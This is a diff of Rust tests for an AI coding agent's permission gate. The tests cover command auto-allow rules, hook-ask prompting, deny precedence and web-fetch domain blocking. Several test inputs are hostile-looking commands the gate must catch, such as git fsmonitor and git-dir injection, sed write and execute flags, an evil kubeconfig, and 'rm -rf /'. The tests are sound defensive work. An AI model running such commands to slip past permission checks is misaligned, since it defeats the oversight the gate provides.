+                    let decision = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
+                    assert_eq!(prompts.borrow().len(), 1, "{cmd} must prompt (protected)");
+                    assert!(
+                        matches!(decision, Decision::Reject(_)),
+                        "{cmd} must not auto-allow"
+                    );
+                }
+                for cmd in ["touch notes.md", "mkdir -p build/out"] {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let mut config = crate::permission::types::PermissionConfig::new(vec![]);
+                    config.prompt_policy = PromptPolicy::Auto;
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, _events) = manager_with_recording_client(
+                        &cwd,
+                        Some(config),
+                        client,
+                        ClientType::Generic,
+                    );
+                    let decision = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
+                    assert_eq!(prompts.borrow().len(), 0, "{cmd} auto-allows");
+                    assert!(matches!(decision, Decision::Allow), "{cmd} auto-allows");
                 }
             })
             .await;
@@ -6103,7 +6874,7 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(AccessKind::Bash("ls".into()), tool_call(), None, None, None),
+                    decide(&mgr, AccessKind::Bash("ls".into()), tool_call()),
                 )
                 .await
                 .expect("permission request must resolve, not hang");
@@ -6140,24 +6911,20 @@ mod tests {
                 drop(rx);
                 cmd_tx
                     .send(PermissionCommand::Request {
-                        access: AccessKind::Bash("curl http://example.com".into()),
-                        tool_call_update: tool_call(),
-                        path_context: None,
+                        request: PermissionRequest::new(
+                            AccessKind::Bash("curl http://example.com".into()),
+                            tool_call(),
+                        ),
                         respond_to: tx,
-                        session_id: None,
-                        subagent_type: None,
-                        subagent_description: None,
                     })
                     .expect("actor alive");
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::Bash("curl http://example.com".into()),
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -6235,16 +7002,14 @@ mod tests {
                 let (respond_to, response) = oneshot::channel::<PermissionResolution>();
                 cmd_tx
                     .send(PermissionCommand::Request {
-                        access: AccessKind::MCPTool {
-                            name: "test_server__do_thing".into(),
-                            input: serde_json::Value::Null,
-                        },
-                        tool_call_update: tool_call(),
-                        path_context: None,
+                        request: PermissionRequest::new(
+                            AccessKind::MCPTool {
+                                name: "test_server__do_thing".into(),
+                                input: serde_json::Value::Null,
+                            },
+                            tool_call(),
+                        ),
                         respond_to,
-                        session_id: None,
-                        subagent_type: None,
-                        subagent_description: None,
                     })
                     .expect("actor alive");
                 tokio::time::timeout(std::time::Duration::from_secs(5), async {
@@ -6304,13 +7069,11 @@ mod tests {
                 let (tx, rx) = oneshot::channel::<PermissionResolution>();
                 cmd_tx
                     .send(PermissionCommand::Request {
-                        access: AccessKind::Bash("curl http://example.com".into()),
-                        tool_call_update: tool_call(),
-                        path_context: None,
+                        request: PermissionRequest::new(
+                            AccessKind::Bash("curl http://example.com".into()),
+                            tool_call(),
+                        ),
                         respond_to: tx,
-                        session_id: None,
-                        subagent_type: None,
-                        subagent_description: None,
                     })
                     .expect("actor alive");
                 tokio::time::timeout(std::time::Duration::from_secs(5), async {
@@ -6324,12 +7087,10 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::Bash("curl http://example.com".into()),
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -6359,15 +7120,7 @@ mod tests {
                 let tmp = tempfile::tempdir().unwrap();
                 let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
                 let (mgr, mut events) = test_manager(&cwd, true, None);
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("echo hi".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("echo hi".into()), tool_call()).await;
                 assert_eq!(d, Decision::Allow);
                 let ev = events
                     .try_recv()
@@ -6398,12 +7151,10 @@ mod tests {
                     manager_with_recording_client(&cwd, None, client, ClientType::Generic);
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::Bash("curl http://example.com".into()),
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -6493,15 +7244,12 @@ mod tests {
                 // Request A parks in the gated prompt; B then arrives and overlaps it.
                 let mgr_a = mgr.clone();
                 let a = tokio::task::spawn_local(async move {
-                    mgr_a
-                        .request(
-                            AccessKind::Bash("curl http://a.example.com".into()),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        )
-                        .await
+                    decide(
+                        &mgr_a,
+                        AccessKind::Bash("curl http://a.example.com".into()),
+                        tool_call(),
+                    )
+                    .await
                 });
                 // Bounded so a regression that never prompts fails cleanly, not hangs.
                 for _ in 0..1000 {
@@ -6517,15 +7265,12 @@ mod tests {
                 );
                 let mgr_b = mgr.clone();
                 let b = tokio::task::spawn_local(async move {
-                    mgr_b
-                        .request(
-                            AccessKind::Bash("curl http://b.example.com".into()),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        )
-                        .await
+                    decide(
+                        &mgr_b,
+                        AccessKind::Bash("curl http://b.example.com".into()),
+                        tool_call(),
+                    )
+                    .await
                 });
                 // Let B's request() increment the in-flight counter and enqueue
                 // before releasing A, so A's emit observes both in flight.
@@ -6604,7 +7349,7 @@ mod tests {
                 );
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None),
+                    decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()),
                 )
                 .await
                 .expect("permission request must resolve, not hang");
@@ -6700,13 +7445,7 @@ mod tests {
                 );
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
-                        AccessKind::Bash("cat notes.txt".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    ),
+                    decide(&mgr, AccessKind::Bash("cat notes.txt".into()), tool_call()),
                 )
                 .await
                 .expect("permission request must resolve, not hang");
@@ -6811,6 +7550,11 @@ mod tests {
         assert!(!is_safe_command("timeout 5 ps auxe"));
 
         // Git commands
+        assert!(is_safe_command("echo done"));
+        assert!(is_safe_command("printf %s x"));
+        assert!(!is_safe_command("echox"));
+        assert!(!is_safe_command("sed -n 240,260p src/lib.rs"));
+        assert!(!is_safe_command("sed -i s/a/b/ src/lib.rs"));
         assert!(is_safe_command("git status"));
         assert!(is_safe_command("git branch"));
         assert!(is_safe_command("git log"));
@@ -6960,6 +7704,37 @@ mod tests {
         assert_eq!(default_always_allow_scope(&words("cargo test --lib")), 3);
         assert_eq!(default_always_allow_scope(&words("npm run build")), 2);
         // Prefix collisions with safe binaries stay on the default path.
+        assert_eq!(
+            default_always_allow_scope(&words("gh pr view 123 --json title")),
+            3
+        );
+        assert_eq!(
+            default_always_allow_scope(&words("gh run list --limit 5")),
+            3
+        );
+        assert_eq!(
+            default_always_allow_scope(&words("gh pr --repo owner/x view")),
+            5
+        );
+        assert_eq!(
+            default_always_allow_scope(&words("gh --repo owner/x pr view")),
+            5
+        );
+        assert_eq!(default_always_allow_scope(&words("gh status")), 2);
+        assert_eq!(
+            minimum_always_allow_scope(&words("gh pr view 123 --json title")),
+            3
+        );
+        assert_eq!(minimum_always_allow_scope(&words("GH.EXE pr view 1")), 3);
+        assert_eq!(
+            default_always_allow_scope(&words("/usr/bin/gh pr view 1")),
+            3
+        );
+        assert_eq!(default_always_allow_scope(&words("GH.EXE pr view 1")), 3);
+        assert_eq!(
+            default_always_allow_scope(&words("Sed.EXE -n 1,5p a.rs")),
+            words("Sed.EXE -n 1,5p a.rs").len()
+        );
         assert_eq!(default_always_allow_scope(&words("lsof -i :8080")), 2);
         assert_eq!(default_always_allow_scope(&[]), 0);
         assert_eq!(default_always_allow_scope(&words("pwd")), 1);
@@ -6974,6 +7749,12 @@ mod tests {
         assert_eq!(default_always_allow_scope(&words("rm -rf target/debug")), 3);
         // …and the minimum pins there too, so narrowing cannot reach a
         // prefix that enforcement would never honor.
+        assert_eq!(default_always_allow_scope(&words("sed -n 1,5p a.rs")), 4);
+        assert_eq!(minimum_always_allow_scope(&words("sed -n 1,5p a.rs")), 4);
+        assert_eq!(
+            default_always_allow_scope(&words("/usr/bin/sed -n 1p a.rs")),
+            4
+        );
         assert_eq!(
             minimum_always_allow_scope(&words("git push origin main")),
             4
@@ -7717,15 +8498,7 @@ mod tests {
                 let prompts = client.prompts.clone();
                 let (mgr, mut events) =
                     manager_with_recording_client(&cwd, None, client, ClientType::Generic);
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("cargo check".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("cargo check".into()), tool_call()).await;
                 assert!(matches!(d, Decision::Reject(_)), "Ask cargo check: {d:?}");
                 let ev = events.try_recv().expect("event");
                 assert!(ev.user_prompted && !ev.auto_approved);
@@ -7739,15 +8512,7 @@ mod tests {
                 mgr.set_classifier(Some(LlmPermissionClassifier::with_fixed_model_text(
                     r#"{"thinking":"ok","shouldBlock":false,"reason":"ok"}"#,
                 )));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("cargo check".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("cargo check".into()), tool_call()).await;
                 assert_eq!(d, Decision::Allow, "Auto cargo check must allow: {d:?}");
                 let ev = events.try_recv().expect("event");
                 assert!(ev.auto_approved && !ev.user_prompted);
@@ -7787,15 +8552,7 @@ mod tests {
                 let (mgr, mut events) =
                     manager_with_recording_client(&cwd, None, client, ClientType::Generic);
                 for cmd in CMDS {
-                    let d = mgr
-                        .request(
-                            AccessKind::Bash((*cmd).into()),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        )
-                        .await;
+                    let d = decide(&mgr, AccessKind::Bash((*cmd).into()), tool_call()).await;
                     assert!(
                         matches!(d, Decision::Reject(_)),
                         "default/{cmd}: expected prompt-reject, got {d:?}"
@@ -7815,15 +8572,7 @@ mod tests {
                 let (clf, seen) = capturing_classifier(ClassifierVerdict::Allow);
                 mgr.set_classifier(Some(clf));
                 for (i, cmd) in CMDS.iter().enumerate() {
-                    let d = mgr
-                        .request(
-                            AccessKind::Bash((*cmd).into()),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        )
-                        .await;
+                    let d = decide(&mgr, AccessKind::Bash((*cmd).into()), tool_call()).await;
                     assert!(matches!(d, Decision::Allow), "auto/{cmd}: {d:?}");
                     assert_eq!(seen.lock().unwrap().len(), i + 1, "auto/{cmd}");
                     // Every exec-risk command carries an exec_or_ambient_git (or
@@ -7863,9 +8612,7 @@ mod tests {
                     "git --git-dir=/evil/.git status",
                     "git -ccore.fsmonitor=/tmp/pwn status",
                 ] {
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
-                        .await;
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
                     assert!(
                         matches!(d, Decision::Reject(_)),
                         "broad git grant must not auto-allow {cmd}: {d:?}"
@@ -7892,15 +8639,7 @@ mod tests {
                 let prompts = client.prompts.clone();
                 let (mgr, _e) =
                     manager_with_recording_client(&cwd, None, client, ClientType::Generic);
-                let d = mgr
-                    .request(
-                        AccessKind::Bash(EXACT.into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash(EXACT.into()), tool_call()).await;
                 assert_eq!(d, Decision::Allow, "exact grant must allow");
                 assert_eq!(prompts.borrow().len(), 0);
 
@@ -7909,15 +8648,7 @@ mod tests {
                 let (mgr, _e) =
                     manager_with_recording_client(&cwd, None, client, ClientType::Generic);
                 mgr.set_yolo_mode(true);
-                let d = mgr
-                    .request(
-                        AccessKind::Bash(EXACT.into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash(EXACT.into()), tool_call()).await;
                 assert_eq!(d, Decision::Allow, "yolo must allow");
                 assert_eq!(prompts.borrow().len(), 0);
             })
@@ -7941,9 +8672,7 @@ mod tests {
                     "git diff",
                     "timeout 1 git status",
                 ] {
-                    let d = mgr
-                        .request(AccessKind::Bash(cmd.into()), tool_call(), None, None, None)
-                        .await;
+                    let d = decide(&mgr, AccessKind::Bash(cmd.into()), tool_call()).await;
                     assert_eq!(d, Decision::Allow, "control: {cmd}");
                     let ev = events.try_recv().expect("allow event");
                     assert!(ev.auto_approved && !ev.user_prompted, "{cmd}");
@@ -7951,15 +8680,12 @@ mod tests {
                 assert_eq!(prompts.borrow().len(), 0);
 
                 // Safe-list is wrapper-only; transparent outer layers still prompt.
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("command env git status".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("command env git status".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(matches!(d, Decision::Reject(_)), "{d:?}");
                 let ev = events.try_recv().expect("prompt event");
                 assert!(ev.user_prompted && !ev.auto_approved);
@@ -8043,6 +8769,9 @@ mod tests {
         assert!(bash_request_floor_requires_prompt(Some(&write)));
 
         // `rm` operands are real-file writes AND a dangerous command.
+        let echo_write = evaluate_bash("echo secret > /etc/thing", &state, true);
+        assert!(echo_write.assessment.contains(FileWrite));
+        assert!(bash_request_floor_requires_prompt(Some(&echo_write)));
         let dangerous = evaluate_bash("rm -rf /", &state, true).assessment;
         assert!(dangerous.contains(FileWrite) && dangerous.contains(DangerousCommand));
 
@@ -8480,6 +9209,84 @@ mod tests {
     }
 
     #[test]
+    fn always_allow_sed_persists_full_command_and_does_not_leak_to_writes() {
+        let cmd = "sed -n 240,260p src/a.rs";
+        let cmd_words: Vec<String> = cmd.split_whitespace().map(str::to_owned).collect();
+        assert_eq!(
+            default_always_allow_scope(&cmd_words),
+            cmd_words.len(),
+            "sed must pin to the full command"
+        );
+
+        let mut state = PermissionState::default();
+        bash_grants::persist_bash_always_allow(&mut state, cmd, cmd);
+        assert!(
+            state.allowed_bash_commands.contains(cmd),
+            "the full sed command is the saved key: {:?}",
+            state.allowed_bash_commands
+        );
+        assert!(matches!(
+            evaluate_bash_segments(cmd, &state),
+            SegmentEvaluation::AutoAllow {
+                via_session_grant: true
+            }
+        ));
+        for other in [
+            "sed -n 1,5p src/a.rs",
+            "sed -i s/a/b/ src/a.rs",
+            "sed -n 1w/tmp/x src/a.rs",
+            "sed -n 1e src/a.rs",
+            "sed -n 240,260p src/a.rs -e 1w/tmp/x",
+        ] {
+            assert!(
+                matches!(
+                    evaluate_bash_segments(other, &state),
+                    SegmentEvaluation::NeedsPrompts { .. }
+                ),
+                "grant for {cmd:?} must not cover {other:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn path_qualified_grant_does_not_bypass_unsafe_flag_guard() {
+        let mut state = PermissionState::default();
+        state
+            .allowed_bash_commands
+            .insert("/usr/bin/kubectl get".to_string());
+        assert!(matches!(
+            evaluate_bash_segments("/usr/bin/kubectl get pods", &state),
+            SegmentEvaluation::AutoAllow {
+                via_session_grant: true
+            }
+        ));
+        assert!(matches!(
+            evaluate_bash_segments(
+                "/usr/bin/kubectl get pods --kubeconfig /tmp/evil.yaml",
+                &state
+            ),
+            SegmentEvaluation::NeedsPrompts { .. }
+        ));
+    }
+
+    #[test]
+    fn evaluate_prefix_grant_covers_echo_interstitials() {
+        let mut state = PermissionState::default();
+        state.allowed_bash_commands.insert("gh pr".to_string());
+        for cmd in [
+            "gh pr view 277700 --json title && echo done",
+            "cd /repo && gh pr diff 277700 | wc -l; echo saved",
+        ] {
+            match evaluate_bash_segments(cmd, &state) {
+                SegmentEvaluation::AutoAllow { via_session_grant } => {
+                    assert!(via_session_grant, "{cmd}")
+                }
+                other => panic!("expected AutoAllow for {cmd}, got {other:?}"),
+            }
+        }
+    }
+
+    #[test]
     fn evaluate_bash_glob_grant_matches_mid_command() {
         // A pattern-editor grant (allowed_bash_globs) auto-allows the commands
         // it previews as matching, and only those.
@@ -8673,6 +9480,320 @@ mod tests {
         }
     }
 
+    mod hook_ask {
+        use super::*;
+        use crate::permission::types::{
+            HookAsk, PatternMode, PermissionConfig, PermissionRule, RuleAction, ToolFilter,
+        };
+
+        fn ask() -> HookAsk {
+            HookAsk {
+                hook_name: "guard".to_owned(),
+                reason: Some("confirm this".to_owned()),
+            }
+        }
+
+        async fn request_with_ask(
+            mgr: &PermissionHandle,
+            access: AccessKind,
+        ) -> PermissionResolution {
+            tokio::time::timeout(
+                std::time::Duration::from_secs(5),
+                mgr.request_with_context(PermissionRequest {
+                    hook_ask: Some(ask()),
+                    ..PermissionRequest::new(access, tool_call())
+                }),
+            )
+            .await
+            .expect("permission request must resolve, not hang")
+        }
+
+        #[tokio::test]
+        async fn ask_prompts_where_the_manager_would_auto_approve() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    for yolo in [true, false] {
+                        let tmp = tempfile::tempdir().unwrap();
+                        let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                        let client = RecordingClient::default();
+                        let prompts = client.prompts.clone();
+                        let (mgr, mut events) =
+                            manager_with_recording_client(&cwd, None, client, ClientType::Generic);
+                        mgr.set_yolo_mode(yolo);
+
+                        let resolution =
+                            request_with_ask(&mgr, AccessKind::Read(Some("a.rs".into()))).await;
+
+                        assert!(
+                            matches!(resolution.decision, Decision::Reject(_)),
+                            "yolo={yolo}: the user's answer must decide, got {:?}",
+                            resolution.decision
+                        );
+                        assert_eq!(prompts.borrow().len(), 1, "yolo={yolo}");
+                        let ev = events.try_recv().expect("event must be emitted");
+                        assert!(ev.user_prompted, "yolo={yolo}");
+                        assert_eq!(ev.decision_reason.as_deref(), Some(reasons::HOOK_ASK));
+                    }
+                })
+                .await;
+        }
+
+        #[tokio::test]
+        async fn ask_prompts_under_always_allow() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let mut config = crate::permission::types::PermissionConfig::new(vec![]);
+                    config.prompt_policy = crate::permission::types::PromptPolicy::Allow;
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) = manager_with_recording_client(
+                        &cwd,
+                        Some(config),
+                        client,
+                        ClientType::Generic,
+                    );
+
+                    let resolution =
+                        request_with_ask(&mgr, AccessKind::Read(Some("a.rs".into()))).await;
+
+                    assert!(
+                        matches!(resolution.decision, Decision::Reject(_)),
+                        "alwaysAllow must still prompt on a hook ask, got {:?}",
+                        resolution.decision
+                    );
+                    assert_eq!(prompts.borrow().len(), 1);
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert!(ev.user_prompted);
+                    assert_eq!(ev.decision_reason.as_deref(), Some(reasons::HOOK_ASK));
+                })
+                .await;
+        }
+
+        #[tokio::test]
+        async fn ask_prompts_through_the_auto_mode_fast_path() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) =
+                        manager_with_recording_client(&cwd, None, client, ClientType::Generic);
+                    mgr.set_auto_mode(true);
+
+                    let resolution = request_with_ask(&mgr, AccessKind::Edit("a.rs".into())).await;
+
+                    assert!(
+                        matches!(resolution.decision, Decision::Reject(_)),
+                        "the user's answer must decide, got {:?}",
+                        resolution.decision
+                    );
+                    assert_eq!(prompts.borrow().len(), 1);
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(ev.decision_reason.as_deref(), Some(reasons::HOOK_ASK));
+                    assert_eq!(
+                        ev.classifier_source, None,
+                        "the fast path decided nothing, so the request stays unclassified"
+                    );
+                })
+                .await;
+        }
+
+        #[tokio::test]
+        async fn ask_prompts_through_a_saved_grant() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let mut seeded = PermissionState::default();
+                    seeded
+                        .allowed_mcp_tools
+                        .insert("test_server__do_thing".to_owned());
+                    persist_state(&cwd, &seeded, None).await;
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) =
+                        manager_with_recording_client(&cwd, None, client, ClientType::Generic);
+                    let access = || AccessKind::MCPTool {
+                        name: "test_server__do_thing".into(),
+                        input: serde_json::Value::Null,
+                    };
+
+                    assert_eq!(decide(&mgr, access(), tool_call()).await, Decision::Allow);
+                    assert!(prompts.borrow().is_empty());
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(ev.decision_reason.as_deref(), Some(reasons::SESSION_GRANT));
+
+                    let resolution = request_with_ask(&mgr, access()).await;
+                    assert!(
+                        matches!(resolution.decision, Decision::Reject(_)),
+                        "the user's answer must decide, got {:?}",
+                        resolution.decision
+                    );
+                    assert_eq!(prompts.borrow().len(), 1);
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(ev.decision_reason.as_deref(), Some(reasons::HOOK_ASK));
+                })
+                .await;
+        }
+
+        #[tokio::test]
+        async fn ask_prompts_through_a_classifier_allow_and_clears_the_denial_streak() {
+            use crate::permission::auto_mode::{
+                ClassifierMessage, ClassifierPromptType, HeuristicPermissionClassifier,
+                LlmPermissionClassifier,
+            };
+            use std::sync::atomic::{AtomicU32, Ordering};
+
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) =
+                        manager_with_recording_client(&cwd, None, client, ClientType::Generic);
+                    mgr.set_auto_mode(true);
+                    let calls = std::sync::Arc::new(AtomicU32::new(0));
+                    mgr.set_classifier(Some(std::sync::Arc::new(LlmPermissionClassifier {
+                        classify_text: Some(std::sync::Arc::new(
+                            move |_messages: Vec<ClassifierMessage>| {
+                                let first = calls.fetch_add(1, Ordering::Relaxed) == 0;
+                                Box::pin(async move {
+                                    Ok(if first {
+                                        r#"{"shouldBlock":true,"reason":"no"}"#.to_owned()
+                                    } else {
+                                        r#"{"shouldBlock":false,"reason":"fine"}"#.to_owned()
+                                    })
+                                })
+                            },
+                        )),
+                        classify_channel: None,
+                        fallback: HeuristicPermissionClassifier,
+                        prompt_type: ClassifierPromptType::Full,
+                    })));
+                    let access = || AccessKind::MCPTool {
+                        name: "test_server__do_thing".into(),
+                        input: serde_json::Value::Null,
+                    };
+
+                    let blocked = tokio::time::timeout(
+                        std::time::Duration::from_secs(5),
+                        decide(&mgr, access(), tool_call()),
+                    )
+                    .await
+                    .expect("classifier block must resolve, not hang");
+                    assert!(matches!(blocked, Decision::PolicyDeny(_)), "{blocked:?}");
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(ev.auto_denials_consecutive, Some(1));
+
+                    let resolution = request_with_ask(&mgr, access()).await;
+                    assert!(
+                        matches!(resolution.decision, Decision::Reject(_)),
+                        "the user's answer must decide, got {:?}",
+                        resolution.decision
+                    );
+                    assert_eq!(prompts.borrow().len(), 1);
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(ev.decision_reason.as_deref(), Some(reasons::HOOK_ASK));
+                    assert_eq!(
+                        ev.auto_denials_consecutive,
+                        Some(0),
+                        "the classifier allowed, so the streak is broken"
+                    );
+                })
+                .await;
+        }
+
+        #[tokio::test]
+        async fn ask_under_dont_ask_denies_without_prompting() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let mut config = PermissionConfig::new(vec![]);
+                    config.prompt_policy = PromptPolicy::Deny;
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let (mgr, mut events) = manager_with_recording_client(
+                        &cwd,
+                        Some(config),
+                        client,
+                        ClientType::Generic,
+                    );
+                    mgr.set_yolo_mode(true);
+
+                    let resolution =
+                        request_with_ask(&mgr, AccessKind::Read(Some("a.rs".into()))).await;
+
+                    assert!(
+                        matches!(resolution.decision, Decision::PolicyDeny(_)),
+                        "got {:?}",
+                        resolution.decision
+                    );
+                    assert!(prompts.borrow().is_empty(), "dontAsk must not prompt");
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(ev.decision_reason.as_deref(), Some(reasons::PROMPT_DENY));
+                })
+                .await;
+        }
+
+        #[tokio::test]
+        async fn ask_on_a_handle_that_cannot_prompt_allows() {
+            let resolution = PermissionHandle::AllowAll
+                .request_with_context(PermissionRequest {
+                    hook_ask: Some(ask()),
+                    ..PermissionRequest::new(AccessKind::Read(Some("a.rs".into())), tool_call())
+                })
+                .await;
+            assert!(matches!(resolution.decision, Decision::Allow));
+            assert!(resolution.event.is_none());
+        }
+
+        #[tokio::test]
+        async fn ask_does_not_soften_a_policy_deny() {
+            let local = tokio::task::LocalSet::new();
+            local
+                .run_until(async {
+                    let tmp = tempfile::tempdir().unwrap();
+                    let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                    let client = RecordingClient::default();
+                    let prompts = client.prompts.clone();
+                    let config = PermissionConfig::new(vec![PermissionRule {
+                        action: RuleAction::Deny,
+                        tool: ToolFilter::Bash,
+                        pattern: Some("rm -rf *".to_owned()),
+                        pattern_mode: PatternMode::Glob,
+                    }]);
+                    let (mgr, mut events) = manager_with_recording_client(
+                        &cwd,
+                        Some(config),
+                        client,
+                        ClientType::Generic,
+                    );
+
+                    let resolution =
+                        request_with_ask(&mgr, AccessKind::Bash("rm -rf /tmp/x".into())).await;
+                    assert!(
+                        matches!(resolution.decision, Decision::PolicyDeny(_)),
+                        "a policy deny must still deny, got {:?}",
+                        resolution.decision
+                    );
+                    assert_eq!(prompts.borrow().len(), 0, "a deny must not prompt");
+                    let ev = events.try_recv().expect("event must be emitted");
+                    assert_eq!(ev.decision_reason.as_deref(), Some(reasons::POLICY_DENY));
+                })
+                .await;
+        }
+    }
     mod mcp_pre_decision {
         use super::*;
 
@@ -8826,6 +9947,84 @@ mod tests {
             let state = PermissionState::default();
             assert!(mcp_pre_decision("linear__list", &state, true, true).is_none());
         }
+        #[test]
+        fn pre_decision_deny_wins_over_tool_and_server_grants() {
+            let mut state = PermissionState::default();
+            state.allowed_mcp_tools.insert("linear__list".to_string());
+            state.allowed_mcp_servers.insert("linear".to_string());
+            state
+                .disallowed_mcp_tools
+                .insert("linear__list".to_string());
+            assert!(matches!(
+                mcp_pre_decision("linear__list", &state, false, false),
+                Some(Decision::Reject(r)) if r.contains("previously rejected")
+            ));
+            assert!(matches!(
+                mcp_pre_decision("linear__create", &state, false, false),
+                Some(Decision::Allow)
+            ));
+        }
+
+        #[test]
+        fn pre_decision_deny_binds_under_ask_floor_regardless_of_gate() {
+            let mut state = PermissionState::default();
+            state
+                .disallowed_mcp_tools
+                .insert("linear__list".to_string());
+            for remember in [false, true] {
+                assert!(matches!(
+                    mcp_pre_decision("linear__list", &state, true, remember),
+                    Some(Decision::Reject(_))
+                ));
+            }
+        }
+    }
+
+    mod web_fetch_deny {
+        use super::*;
+
+        fn denied(values: &[&str]) -> HashSet<String> {
+            values.iter().map(|s| (*s).to_string()).collect()
+        }
+
+        #[test]
+        fn matches_exact_host_www_and_subdomains() {
+            let set = denied(&["example.com"]);
+            for host in [
+                "example.com",
+                "www.example.com",
+                "EXAMPLE.com",
+                "api.example.com",
+                "a.b.example.com",
+            ] {
+                assert_eq!(
+                    denied_web_fetch_domain(host, &set),
+                    Some("example.com"),
+                    "{host} must match the deny"
+                );
+            }
+        }
+
+        #[test]
+        fn does_not_match_lookalike_suffixes() {
+            let set = denied(&["example.com"]);
+            for host in ["notexample.com", "example.com.evil.net", "example.org"] {
+                assert_eq!(denied_web_fetch_domain(host, &set), None, "{host}");
+            }
+        }
+
+        #[test]
+        fn www_host_deny_stays_narrow() {
+            assert_eq!(
+                web_fetch_deny_key_from_url("https://www.com/x").as_deref(),
+                Some("www.com")
+            );
+            let set = denied(&["www.com"]);
+            assert_eq!(denied_web_fetch_domain("www.com", &set), Some("www.com"));
+            for host in ["example.com", "foo.com", "com"] {
+                assert_eq!(denied_web_fetch_domain(host, &set), None, "{host}");
+            }
+        }
     }
 
     /// Auto mode on the real permission gate: allowlist / classifier allow /
@@ -8850,15 +10049,12 @@ mod tests {
                 mgr.set_auto_mode(true);
                 assert!(mgr.is_auto_mode());
                 assert!(!mgr.is_yolo_mode());
-                let d = mgr
-                    .request(
-                        AccessKind::Read(Some("README.md".into())),
-                        dummy_update.clone(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Read(Some("README.md".into())),
+                    dummy_update.clone(),
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "auto allowlist Read must allow, got {d:?}"
@@ -8866,30 +10062,24 @@ mod tests {
 
                 // Classifier allow on bash.
